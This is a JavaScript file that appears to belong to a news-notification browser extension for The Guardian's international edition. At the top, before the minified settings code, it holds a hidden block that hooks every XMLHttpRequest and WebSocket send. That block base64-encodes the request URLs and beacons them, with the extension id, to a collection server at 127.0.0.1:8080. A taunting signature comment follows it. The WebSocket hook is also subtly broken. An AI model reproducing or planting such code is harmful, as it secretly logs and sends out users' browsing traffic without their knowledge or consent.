function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
!function(){"use strict";function e(){var e,i=JSON.parse(window.localStorage.getItem("constantsData"));if(i&&i.cv>=t.cv)for(e in t)-1===o.indexOf(e)&&(t[e]=void 0!==i[e]?i[e]:t[e]);for(e in t)if("i18n_"==e.substr(0,5)){var n=chrome.i18n.getMessage("const_"+e);n&&(t[e.substr(5)]=n)}window.consts56c4372f=t}var t={cv:3,isSettingPage:!0,isSettingToggleForPushNotification:!0,isSettingToggleForModePushNotification:!1,showDesktopNotifications:!0,newsStatuses:["all","important"],pushModeDefault:"all",showNewItemsBadgeCounter:!0,isLogoIcon:!0,needShow:!1,count_items_show:30,conditionShow:"important",source:"Theguardian_international",sourceLink:"https://www.theguardian.com/international",foSelectorTitle:".al",notifyTag:"forbes-nr-push",updateItemsPeriod:6e4,updateMainItemsPeriod:3e3,pushInterval:108e5,notifyLiveTime:5e3,bodyNotifyShow:!1,maxLengthBodyNotify:80,selectorImagesSettings:"#image-setting-box",selectorNewsSettings:"#setting-box",foSelectorDescription:".ev",newsTemplates:[],newsTypes:["import","export"],firstTimeTypePush:"",layer:"/script",needNewsCheck:!1,toSend:!1,isHeaderText:!0,i18n_headerText:"International",i18n_defaultTag:"News",i18n_errorMsg:"Error receiving data"},o=["source","isSettingToggleForPushNotification","isSettingToggleForModePushNotification","showDesktopNotifications","toSend"];t.save=function(t){window.localStorage.setItem("constantsData",JSON.stringify(t)),e()},e()}();